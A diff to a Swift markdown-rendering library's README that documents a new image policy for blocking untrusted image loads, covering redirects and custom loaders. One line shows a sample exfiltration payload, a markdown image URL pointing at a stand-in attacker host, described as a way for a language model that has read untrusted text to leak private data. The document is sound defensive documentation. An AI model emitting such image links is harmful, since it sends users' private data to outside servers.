@@ -105,6 +105,8 @@ let view = GlimmerView(configuration: configuration)
   `GlimmerText`) to make images tappable: it is called with the image's URL and alt text.
   The default loader shares HTTP responses and prepared images across views, coalesces concurrent requests, and
   prepares images at their display size. See [Image caching](#image-caching) for budgets and custom sessions.
+- **`imagePolicy`** (`GlimmerImagePolicy`): decides which images load. `nil`, the default, loads every image. Set one
+  when the markdown is written by a language model or by other people. See [Image policy](#image-policy).
 - **`inlineImageShape`** (`GlimmerInlineImageShape`): `.circle` by default, cropping the image to fill the circle.
   Use `.roundedRectangle(cornerRadius: 3)` for the previous aspect-fitted appearance, or a radius of `0` for square
   corners. Applies to images inside text, including extension images; standalone images use the theme's styling.
@@ -155,6 +157,58 @@ Existing `GlimmerImageLoader` implementations continue to work. They can optiona
 default implementation calls `loadImage(from:)`. The built-in loader prepares thumbnails off the main thread,
 preserves aspect ratio and orientation, and never upscales. Circle clipping stays in the view.
 
+## Image policy
+
+Glimmer requests an image as soon as its text is laid out. When the markdown is written by a language model that has
+read untrusted text, or by another user, an image URL can carry private data to someone else's server
+(`![x](https://attacker.example/?d=…)`) or work as a tracking pixel. An image policy lets the app decide, for each
+image, whether Glimmer loads it:
+
+```swift
+struct AppImages: GlimmerImagePolicy {
+    func decision(for image: GlimmerImageCandidate) -> GlimmerImageDecision {
+        image.url.scheme == "https" && image.url.host() == "images.example.com" ? .load : .showAltText
+    }
+}
+
+let configuration = GlimmerConfiguration(imagePolicy: AppImages())
+```
+
+The policy receives a `GlimmerImageCandidate`: the image's `url`, `alt` text and `title`, and its `origin`. The origin
+is `.markdown` for an image written in the text, and `.extensionToken(kind:)` for one an extension produces, such as
+an emoji shortcode (its `kind` is `"emoji"`). The policy answers with one of:
+
+| Answer | What is shown |
+|---|---|
+| `.load` | The image, as without a policy. |
+| `.showAltText` | The alt text as ordinary text, styled like the text around it. An image with empty alt text shows nothing. An extension's image shows its token's text: `:octocat:` for an emoji shortcode. |
+| `.hide` | Nothing. |
+
+An image that is not loaded is never requested, from the network or from a cache, and reserves no space. A standalone
+image's alt text is an ordinary paragraph, and a paragraph left empty is left out. An image that shows nothing takes
+with it the white space that stood only around it, so a hidden image above its caption leaves no blank line. The text
+copies as what is shown, not as `![alt](url)`, and that includes `markdownSource()`; it is not reported to
+`onImageTap`; and VoiceOver reads it as text.
+
+When writing a policy:
+
+- **Every image is asked about**, whatever its URL's scheme: relative names, `file:` and `data:` URLs too. Under a
+  policy, an image whose URL does not parse shows its alt text.
+- **A policy is a `Hashable` value.** Views with equal policies share composed answers, and downloads of the same
+  image, so two policies that compare equal must decide equally. A struct with no stored properties, or with its
+  allowed hosts as a property, gets this for free. Policies of different types are never equal.
+- **It is asked from any thread, and more than once for the same image**: each time the text is composed while an
+  answer streams, again just before the load, and for each redirect. Answer quickly, and always the same.
+- **Redirects are checked.** Before the built-in loader follows a redirect, it asks the policy about the same image
+  with the URL it redirects to. A refused redirect is not requested and the load fails. The text is already laid out
+  by then, so an inline image keeps its placeholder and a standalone image shows its alt text in its box.
+- **A custom loader has to keep the check.** A `GlimmerImageLoader` that follows redirects itself must call
+  `request.permitsRedirect(to:)` and fail the load on `false`. One that wraps the built-in loader must pass on the
+  `GlimmerImageRequest` it was given, with `loadImage(for:)`; `loadImage(from:)` and a request built from the URL
+  alone carry no policy. Otherwise its redirects are not checked.
+
+With no policy set, nothing changes.
+
 ## Extensions
 
 A `GlimmerExtension` can rewrite the markdown before parsing (`preprocess(_:)`) and turn tokens in plain text into
@@ -201,7 +255,9 @@ keeps its own selection inside. While an answer reveals, the selection stops at 
 
 Copy writes plain text and markdown (`net.daringfireball.markdown`), so a paste into a markdown-aware app keeps
 lists, code, emphasis and links. `markdownSource(for:)` gives the markdown for any range, or, with no range, the whole
-answer as given; `plainText(for:)` gives the plain text copy writes. Hosts can add their own edit-menu and link-menu items:
+answer as given; `plainText(for:)` gives the plain text copy writes. With an [image policy](#image-policy) set,
+`markdownSource()` gives the markdown of the shown text instead, so the URL of a refused image is never handed out.
+Hosts can add their own edit-menu and link-menu items:
 
 ```swift
 view.editMenuActions = { selection in
